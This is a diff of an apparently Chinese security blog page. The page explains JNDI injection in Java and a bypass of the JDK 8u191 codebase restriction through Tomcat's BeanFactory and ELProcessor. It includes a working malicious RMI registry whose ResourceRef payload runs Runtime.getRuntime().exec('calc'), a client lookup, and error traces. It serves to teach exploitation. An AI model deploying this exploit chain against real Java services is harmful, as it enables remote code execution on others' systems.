                 obj <span class="token operator">=</span> Obj<span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span>attrs<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>这里会获取ldap的属性，进入decodeObject，看一下他解析的逻辑：</p>
 <pre class=" language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> codebases <span class="token operator">=</span> <span class="token function">getCodebases</span><span class="token punctuation">(</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>CODEBASE<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">{</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>SERIALIZED_DATA<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>SERIALIZED_DATA<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
                 ClassLoader cl <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">getURLClassLoader</span><span class="token punctuation">(</span>codebases<span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token keyword">return</span> <span class="token function">deserializeObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>attr<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cl<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>REMOTE_LOC<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>REMOTE_LOC<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
                 <span class="token comment" spellcheck="true">// For backward compatibility only</span>
                 <span class="token keyword">return</span> <span class="token function">decodeRmiObject</span><span class="token punctuation">(</span>
                     <span class="token punctuation">(</span>String<span class="token punctuation">)</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>CLASSNAME<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                     <span class="token punctuation">(</span>String<span class="token punctuation">)</span>attr<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> codebases<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 
             attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>OBJECT_CLASS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span> <span class="token punctuation">(</span>attr <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span>
                 <span class="token punctuation">(</span>attr<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>JAVA_OBJECT_CLASSES<span class="token punctuation">[</span>REF_OBJECT<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span>
-                    attr<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>JAVA_OBJECT_CLASSES_LOWER<span class="token punctuation">[</span>REF_OBJECT<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    attr<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>JAVA_OBJECT_CLASSES_LOWER<span class="token punctuation">[</span>REF_OBJECT<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
                 <span class="token keyword">return</span> <span class="token function">decodeReference</span><span class="token punctuation">(</span>attrs<span class="token punctuation">,</span> codebases<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
             <span class="token keyword">return</span> null<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             NamingException ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>我们知道JNDI支持：</p>
 <ul>
@@ -496,22 +496,22 @@ factoryLocation工厂路径
 </ul>
 <h2 id="高版本绕过（JDK-8u191）"><a href="#高版本绕过（JDK-8u191）" class="headerlink" title="高版本绕过（JDK&gt;8u191）"></a>高版本绕过（JDK&gt;8u191）</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在8u191之后在LDAP那里也加了一个trustURLCodebase的判断，因此LDAP这一条路也被封死了。<br>因此现在LDAP、RMI等攻击手法都被封锁了。我们想要从远程加载类就变得异常困难，我们可以重新看一下代码的逻辑：<br>从本地尝试加载类-&gt;加载不到则从远程加载类<br>那么无法从远程加载类，是否可以从本机尝试加载这个类，并达到RCE的目的呢？<br>答案是有的，不过对客户端的环境有所需求,不过其实这个条件也不算是特别苛刻。因为这里用到的是tomcat内置的包，现在比较主流的Java网站不少都是使用springboot搭建的，而springboot内置的就是Tomcat</p>
 <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>先来看一下关键先生：BeanFactory类 这个类就是可以利用的恶意类<br>这个类实现了ObjectFactory接口，ObjectFactory接口里面只有一个抽象方法：getObjectInstance</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
     <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <h3 id="恶意类需满足的条件"><a href="#恶意类需满足的条件" class="headerlink" title="恶意类需满足的条件"></a>恶意类需满足的条件</h3><p>只要远程加载地址​<code>factoryClassLocation</code>​为null时<code>NamingManager.getObjectInstance</code>​ 这个代码就会在<code>com.sun.jndi.rmi.registry.RegistryContext.java</code>​中运行<br>因为​<code>RegistryContext</code>​是RMI对应的利用类即利用RMI且不加载远程地址就会执行这个利用链。而<code>NamingManager.getObjectInstance </code>​又会执行<code>getObjectFactoryFromReference</code>​<br>​<code>getObjectFactoryFromReference </code>​这是一个静态方法，这个静态方法会返回<code>ObjectFactory</code>​类型,并且这里使用了newInstance构造，所以这个类还需要满足拥有无参构造方法<br>​<code>ObjectFactory</code>​我们上面有提到是一个接口类，他只有一个抽象方法,<code>getObjectFactory</code>​</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
     <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>而刚刚好​<code>org.apache.naming.factory.BeanFactory</code>​满足所有要求，在<code>BeanFacory</code>​中的<code>getObjectInstance</code>​可以精心构造，从而执行恶意代码。</p>
 <p>但是若是想要执行这个恶意代码还需要一个​<code>JavaBean</code>​，<code>JaveBean</code>​需要满足的条件：<br>（1）​<code>forceString</code>​指定某个特殊方法名<br>RefAddr ra &#x3D; ref.get(&quot;forceString&quot;);<br>（2）拥有无参构造方法<br>beanClass.newInstance()<br>（3）含有恶意方法</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ELProcessor</span> <span class="token punctuation">{</span>
- <span class="token keyword">public</span> Object <span class="token function">eval</span><span class="token punctuation">(</span>String expression<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ELProcessor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+ <span class="token keyword">public</span> Object <span class="token function">eval</span><span class="token punctuation">(</span>String expression<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>expression<span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+ <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>需要提前设置好pom的依赖：</p>
 <pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
@@ -536,8 +536,8 @@ factoryLocation工厂路径
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
 
         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -549,19 +549,19 @@ factoryLocation工厂路径
         ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
         registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>RMIClient端：</p>
 <pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span>
 
 <span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span>
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RmiClient</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RmiClient</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/Object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>运行结果：</p>
 <h2 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h2><p>一路跟进lookup直到​<code>RegistryContext</code>​的<code>decodeObject</code>​中<br>不加载远程类进入​<code>NamingManager</code>​<br>进入​<code>NamingManager</code>​之后是调用<code>BeanFactory</code>​的<code>getObjectInstance</code>​<br>46行加载恶意的​<code>JavaBean</code>​类<code>ELProcessor</code>​<br>58行获取​<code>forceString</code>​的属性，即x&#x3D;eval<br>这一步可以使得强制将bean对象某个属性的setter方法名指定为非setXXX()。从而就算不用使用setxxx()的方法也可以传入beanClas.getMethod()中，这样就可以成功把我们恶意的代码放到hashMap中。<br>再通过我们第二个add的元素x来作为方法名反射获取一个参数类型是 ​​String.class​的方法<br>后面反射调用就成功执行恶意代码了</p>
@@ -576,8 +576,8 @@ factoryLocation工厂路径
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
 <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ResourceRef<span class="token punctuation">;</span>
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         ResourceRef resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
@@ -586,8 +586,8 @@ factoryLocation工厂路径
         resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"Runtime.getRuntime().exec('calc')"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/exp"</span><span class="token punctuation">,</span> resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>报错：</p>
 <pre class=" language-xml"><code class="language-xml">Exception in thread "main" javax.naming.NamingException: Forced String setter eval threw exception for property x
@@ -646,7 +646,7 @@ Exception in thread "main" javax.naming.NamingException: No set method found for
         
           <li><a href="/categories/">分类</a></li>
         
-          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+          <li><a href="/friends/">友链</a></li>
         
       </ul>
     </div>
@@ -708,7 +708,7 @@ Exception in thread "main" javax.naming.NamingException: No set method found for
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
-      --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+      --><li><a href="/friends/">友链</a></li><!--
     -->
       </ul>
       <ul>
